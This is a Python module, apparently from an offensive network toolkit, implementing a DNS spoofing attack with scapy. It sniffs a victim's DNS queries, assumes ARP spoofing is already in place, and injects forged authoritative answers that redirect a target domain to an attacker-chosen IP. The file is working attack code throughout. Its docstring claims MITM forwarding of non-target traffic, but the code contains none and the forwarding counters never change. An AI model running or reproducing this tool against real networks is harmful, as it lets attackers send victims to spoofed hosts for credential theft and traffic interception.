"""
src/attacks/dns_spoofing.py

DNS spoofing via response injection.
Enhanced with full MITM forwarding for non-target queries/responses.
Assumes ARP spoofing is active between victim and real DNS server.
"""

import threading
import time
from datetime import datetime
from scapy.all import (
    sniff,
    sendp,
    Ether,
    IP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
    get_if_hwaddr,
)
from src.core.network import get_mac_for_ip


class Colors:
    RESET = "\033[0m"       # Reset color to default
    BOLD = "\033[1m"        # Bold text
    UNDERLINE = "\033[4m"   # Underlined text
    RED = "\033[31m"        # Red text
    GREEN = "\033[32m"      # Green text
    YELLOW = "\033[33m"     # Yellow text
    BLUE = "\033[34m"       # Blue text
    MAGENTA = "\033[35m"    # Magenta text
    CYAN = "\033[36m"       # Cyan text
    WHITE = "\033[37m"      # White text


def log_with_color(msg: str, color: str) -> None:
    """Print messages with colors."""
    print(f"{color}{msg}{Colors.RESET}")

class DnsSpoofingAttack(threading.Thread):
    def __init__(
        self,
        domain: str,
        fake_ip: str,
        victim_ip: str,
        interface: str = "enp0s3",
        dns_ip: str = "10.0.0.53",
    ):
        super().__init__(daemon=True)

        self.domain = domain.rstrip(".")
        self.fake_ip = fake_ip
        self.victim_ip = victim_ip
        self.interface = interface
        self.dns_ip = dns_ip

        # Resolve MAC addresses (required for forwarding)
        self.victim_mac = get_mac_for_ip(self.victim_ip, self.interface)
        self.dns_mac = get_mac_for_ip(self.dns_ip, self.interface)
        if not self.victim_mac or not self.dns_mac:
            raise RuntimeError(f"Failed to resolve MAC addresses for victim ({self.victim_ip}) or DNS ({self.dns_ip}). Check connectivity/interface.")

        self._stop_event = threading.Event()

        self.start_time = None
        self.queries_seen = 0
        self.spoofs_sent = 0
        self.queries_forwarded = 0
        self.responses_forwarded = 0

    def _log(self, level: str, msg: str, color: str = Colors.RESET):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[DNS] [{ts}] [{level}] {msg}{Colors.RESET}")

    def _dns_interceptor(self, pkt):
        if self._stop_event.is_set():
            return

        if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS) and pkt.haslayer(DNSQR)):
            return

        dns = pkt[DNS]

        # Only DNS queries
        if dns.qr != 0:
            return

        # Only victim -> DNS
        if pkt[IP].src != self.victim_ip or pkt[IP].dst != self.dns_ip:
            return

        qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
        qtype = pkt[DNSQR].qtype
        self.queries_seen += 1

        self._log("INFO", f"Intercepted DNS query: {qname} from {self.victim_ip}", Colors.GREEN)

        # Ignore IPv6 cleanly
        if qtype == 28:
            return

        # Only spoof target domain
        if qname != self.domain:
            return

        forged = (
            Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
            / IP(dst=pkt[IP].src, src=pkt[IP].dst)
            / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
            / DNS(
                id=dns.id,
                qr=1,
                aa=1,
                qd=dns.qd,
                an=DNSRR(
                    rrname=pkt[DNSQR].qname,
                    ttl=60,
                    rdata=self.fake_ip,
                ),
                ancount=1,
            )
        )

        sendp(forged, iface=self.interface, verbose=False)
        self.spoofs_sent += 1
        self._log("SUCCESS", f"Spoofed {qname} → {self.fake_ip}")


    def run(self):
        self.start_time = time.time()

        self._log("INFO", "DNS spoofing started", Colors.YELLOW)
        self._log("INFO", f"Target: {self.domain} → {self.fake_ip}")
        self._log("INFO", f"Victim: {self.victim_ip} (MAC {self.victim_mac})")
        self._log("INFO", f"Real DNS: {self.dns_ip} (MAC {self.dns_mac})")
        self._log("INFO", "Waiting for victim DNS queries...")

        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self._dns_interceptor,
            store=0,
            stop_filter=lambda _: self._stop_event.is_set(),
        )

    def stop(self):
        self._stop_event.set()
        runtime = time.time() - self.start_time if self.start_time else 0

        self._log(
            "INFO",
            f"Stopped. Runtime={runtime:.1f}s, "
            f"queries_seen={self.queries_seen}, "
            f"spoofs_sent={self.spoofs_sent}, "
            f"queries_forwarded={self.queries_forwarded}, "
            f"responses_forwarded={self.responses_forwarded}"
        )